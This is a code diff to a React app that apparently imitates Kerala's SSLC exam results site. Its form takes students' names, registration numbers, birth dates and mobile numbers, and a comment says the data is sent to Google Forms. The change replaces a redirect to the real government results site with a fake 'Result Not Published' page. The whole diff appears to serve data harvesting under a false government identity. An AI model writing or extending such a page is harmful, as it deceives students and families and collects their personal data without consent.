@@ -8,6 +8,7 @@ function App() {
   const [fields, setFields] = useState({ name: '', reg: '', dd: '', mm: '', yyyy: '', mob: '' });
   const [errorMsg, setErrorMsg] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showResultPage, setShowResultPage] = useState(false);
 
   const sync = (e) => setFields({ ...fields, [e.target.name]: e.target.value });
 
@@ -37,16 +38,38 @@ function App() {
         body: payload 
       });
       
-      // 3. HARD REDIRECT: Added a slight delay so the browser doesn't kill the network request
-      // halfway through, which causes Google Forms to log an empty blank row.
+      // 3. SHOW RESULT PAGE: Wait slightly before showing result page.
       setTimeout(() => {
-        window.location.replace('https://results.kerala.gov.in/');
+        setShowResultPage(true);
       }, 400);
     } catch (err) {
       setIsSubmitting(false); // Re-unlock only on error
       console.error('Signal lost:', err);
     }
   };
+
+  const handleBack = () => {
+    setShowResultPage(false);
+    setIsSubmitting(false);
+    setFields({ name: '', reg: '', dd: '', mm: '', yyyy: '', mob: '' });
+  };
+
+  if (showResultPage) {
+    return (
+      <div className="app-container">
+        <header className="header">
+          <h1 className="title">SSLC RESULTS 2026</h1>
+        </header>
+        <main className="main-content result-page-content">
+          <div className="result-card">
+            <h2 className="result-title">Result Not Published</h2>
+            <p className="result-message">The results for {examType} 2026 have not been published yet. Please check back later.</p>
+            <button className="back-btn" onClick={handleBack}>Go Back</button>
+          </div>
+        </main>
+      </div>
+    );
+  }
 
   return (
     <div className="app-container">
